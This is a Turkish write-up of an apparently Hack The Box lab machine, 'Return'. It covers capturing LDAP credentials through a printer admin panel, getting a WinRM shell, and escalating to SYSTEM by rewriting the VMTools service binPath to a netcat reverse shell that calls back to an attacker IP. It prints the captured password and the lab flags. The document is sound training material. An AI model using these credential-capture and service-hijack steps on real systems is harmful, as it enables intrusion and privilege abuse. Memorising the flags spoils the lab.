<img width="686" height="386" alt="maxresdefault" src="https://github.com/user-attachments/assets/b46a4ece-607f-4104-bcd4-05cba65de478" />

## Hakkında

Return, LDAP kimlik bilgilerini depolayan bir ağ yazıcı yönetim paneline sahip, zorluk seviyesi kolay bir Windows makinesidir. Bu kimlik bilgileri, kötü amaçlı bir LDAP sunucusu girilerek ele geçirilebilir ve bu da WinRM hizmeti aracılığıyla sunucuya erişim sağlanmasına olanak tanır. Kullanıcının, sistem erişimi elde etmek için daha da kötüye kullanılan bir ayrıcalık grubunun parçası olduğu tespit edilir.


## Enumeration

İlk aşamada hedef makinedeki açık portları ve servisleri belirlemek için tam port taraması gerçekleştiriyorum.

```bash
nmap -sS -A -T5 -p- 10.129.51.69
```

<img width="1026" height="727" alt="nmap" src="https://github.com/user-attachments/assets/417b070f-195d-40d6-8168-fc98b68b05b3" />

Tarama sonucunda HTTP, SMB ve WinRM tarafı öne çıkıyor. Özellikle HTTP üzerinde çalışan yönetim arayüzü, ilk erişim için en mantıklı başlangıç noktası.

---

## Printer Management Panel

Web servisine eriştiğimde yazıcı yönetimi için kullanılan bir administration paneliyle karşılaşıyorum.

<img width="578" height="499" alt="site1" src="https://github.com/user-attachments/assets/2cdeaeac-d3ad-4edf-ab06-8c8cbafdaa3d" />

Paneli incelediğimde özellikle **Settings** bölümüne geliyoruz. Burada LDAP bağlantısına ait yapılandırmanın bulunduğu bir alan mevcut.

<img width="1232" height="377" alt="site2" src="https://github.com/user-attachments/assets/aa0379ec-9fc8-4eb3-b9e5-9e5fb403b4e4" />

Buradaki `Server Address` alanı doğrudan kullanıcı tarafından değiştirilebiliyor. Bu durumda uygulamanın LDAP bağlantısı için güvenilir bir backend yerine bizim IP adresimizi test etmek mantıklı.

<img width="771" height="352" alt="site3" src="https://github.com/user-attachments/assets/a86da2ba-4fc6-4bee-8b45-68ada1c9fb37" />


## LDAP Credential Interception

LDAP için standart port olan `389` üzerinde listener açıyorum:

```bash
rlwrap nc -nvlp 389
```

Hedef sistem kısa süre içinde bağlantı kuruyor ve authentication sırasında kullanılan kullanıcı bilgilerini gönderiyor:

<img width="576" height="141" alt="nc" src="https://github.com/user-attachments/assets/b98cf995-f272-4ec6-b0d3-206ac9eaa9f7" />

Aynı davranış Responder ile de doğrulanabilir:

```bash
sudo responder -I tun0
```

<img width="513" height="163" alt="responder1" src="https://github.com/user-attachments/assets/179f5f45-3b17-484a-8d83-616efaccabc3" />

<img width="496" height="434" alt="responder2" src="https://github.com/user-attachments/assets/c3339815-dfa0-4c8f-a127-ffa29276beef" />

Administration panelindeki LDAP endpoint'i saldırgan tarafından kontrol edilebilir hale geldiği için hedef sistem doğrudan bizim endpoint'imize authentication yapıyor ve `svc-printer` hesabının credential'ları elde edilebiliyor.

---

## Credential Validation

Ele geçirilen credential'ların gerçekten geçerli olup olmadığını önce SMB ve WinRM üzerinden kontrol ediyorum.

```bash
nxc smb 10.129.51.69 -u 'svc-printer' -p '1edFg43012!!'

nxc winrm 10.129.51.69 -u 'svc-printer' -p '1edFg43012!!'

```

<img width="1440" height="505" alt="nxc" src="https://github.com/user-attachments/assets/404dced4-d191-4b3a-9ec5-6e798f4a1aa3" />

<img width="1039" height="88" alt="nxc2" src="https://github.com/user-attachments/assets/4b9aca6b-7bf9-478e-aafe-752651345c16" />


SMB tarafında kimlik bilgilerinin kabul edildiğini doğruladıktan sonra erişilebilir share'leri kontrol ediyorum:

```bash
smbmap -H 10.129.51.69 -u 'svc-printer' -p '1edFg43012!!'
```

<img width="805" height="491" alt="smbmap" src="https://github.com/user-attachments/assets/72a72066-33c7-4dd7-ab2e-6c2f57673af7" />

SMB authentication'ın başarılı olması, credential'ların geçerli olduğunu net şekilde ortaya koyuyor. Bir sonraki adımda bu hesapla uzaktan yönetim erişimi aranabilir.

---

## Initial Access — WinRM

`svc-printer` hesabı uzak yönetim için yetkilendirilmiş durumda olduğundan WinRM üzerinden doğrudan shell elde edebiliyorum.

```bash
evil-winrm -i 10.129.51.69 -u 'svc-printer' -p '1edFg43012!!'
```

<img width="1037" height="204" alt="shell" src="https://github.com/user-attachments/assets/aa7c2419-3ae9-46e0-a80b-f976ee64b29b" />

Başarılı bağlantı sonrası:

```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

İlk olarak kullanıcı dizinini kontrol edip `user.txt` dosyasını alıyorum.

```powershell
cd C:\Users\svc-printer\Desktop
ls
cat user.txt
ffafef38c60fa87f5cbd1f1591fbfffa
```

<img width="484" height="236" alt="userflag" src="https://github.com/user-attachments/assets/1d32a2af-dad0-4b4b-b6bb-b9c1239bc040" />


## Privilege Escalation Enumeration

Foothold elde ettikten sonra doğrudan privilege escalation enumeration'a geçiyorum. İlk kontrol edilmesi gereken noktalardan biri mevcut grup üyelikleri.

```powershell
whoami /groups
```

<img width="1007" height="507" alt="privesc1" src="https://github.com/user-attachments/assets/301fcd8c-983a-458a-86a9-40775d4e568e" />

<img width="639" height="307" alt="privesc2" src="https://github.com/user-attachments/assets/e91ae550-dfac-4a67-8cb7-6e0a13c19c6b" />

<img width="671" height="677" alt="privesc3" src="https://github.com/user-attachments/assets/b3d94739-f899-4f02-a8d6-ecb598a3c6b6" />

Burada `SeBackupPrivilege` doğrudan kullanılabilecek önemli bir privilege olsa da mevcut shell'den root elde etmek için bu yolu tercih etmiyorum. Bunun yerine kullanıcının `Server Operators` üyeliğinin sağladığı servis yönetim yetkilerini incelemek daha doğrudan bir privilege escalation yolu sunuyor.


## Service Enumeration

Evil-WinRM içerisinde bulunan `services` fonksiyonu sistemdeki servisleri ve mevcut servis yönetim yetkilerini hızlıca görmek için kullanılabilir.

```powershell
menu
services
```

<img width="642" height="422" alt="privesc4" src="https://github.com/user-attachments/assets/09429dca-77a7-4797-aaeb-36ca1511edda" />

Listeyi burada özellikle belirli bir mantıkla değerlendiriyorum: amaç rastgele bir servis bulmak değil, mevcut hesabın üzerinde operasyon yapabildiği bir servisi tespit etmek. `VMTools` servisi üzerinde gerekli servis kontrol yetkilerinin bulunduğu görülüyor.

Servisin durumunu doğrudan `sc.exe` ile doğruluyorum:

```powershell
sc.exe query VMTools
```

<img width="1172" height="494" alt="privesc5" src="https://github.com/user-attachments/assets/490d4935-b949-403d-b763-dce8f270adee" />


Servis durdurulabiliyor:

```powershell
sc.exe stop VMTools
```

<img width="552" height="164" alt="privesc6" src="https://github.com/user-attachments/assets/89c91c78-c982-44f7-b194-0b0ba85db020" />

Burada kritik olan yalnızca `stop/start` yetkisi değil. Asıl önemli nokta servis yapılandırmasının değiştirilebilmesi. Bu da `binPath` değerini kontrol ettiğimiz bir executable'a yönlendirme ihtimalini ortaya çıkarıyor.

---

## VMTools Service Abuse

<img width="893" height="72" alt="privesc7" src="https://github.com/user-attachments/assets/2287a2b1-b5f9-496d-9b46-8ffaca4ece9a" />

Öncelikle kullanacağım `nc.exe` binary'sini hedef makineye gönderiyorum.

```powershell
upload nc.exe .
```

Daha sonra `VMTools` servisinin çalıştırdığı binary path'i kendi executable'ımıza çeviriyorum:

```powershell
sc.exe config VMTools binPath="C:\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.14.187 1337"
```

```text
[SC] ChangeServiceConfig SUCCESS
```

<img width="1183" height="184" alt="privesc8" src="https://github.com/user-attachments/assets/049d1224-316e-41f7-b297-f7012ce4731f" />


Servis binary'sinin path'i artık kontrol ettiğimiz payload'a işaret ediyor. Sırada kendi makinemizde bağlantıyı beklemek var.

```bash
rlwrap nc -nvlp 1337
```

Ardından hedef sistemde servisi yeniden başlatıyorum:

```powershell
sc.exe start VMTools
```

Bağlantı geldiğinde:

```text
connect to [10.10.14.187] from (UNKNOWN) [10.129.51.69] 50654
Microsoft Windows [Version 10.0.17763.107]
```

Shell'in hangi güvenlik bağlamında çalıştığını doğruluyorum:

```cmd
whoami
```

Sonuç:

```text
nt authority\system
```
<img width="507" height="192" alt="rootshell" src="https://github.com/user-attachments/assets/78280e1d-bd5b-4d31-bee5-515380de1c63" />

Böylece `svc-printer` hesabından doğrudan **SYSTEM** seviyesine çıkılmış oluyor.

---
## Root Flag

Artık sistem seviyesinde erişim mevcut. Administrator profilinin Desktop dizinine geçip `root.txt` dosyasını okuyorum.

```cmd
cd C:\Users\Administrator\Desktop
dir
type root.txt
```

```text
924469a2a0f2fc8c5b8be6f50d57190e
```
<img width="413" height="301" alt="rootflag" src="https://github.com/user-attachments/assets/82aca659-b50d-46f2-9b6e-0a7c45a19ef6" />
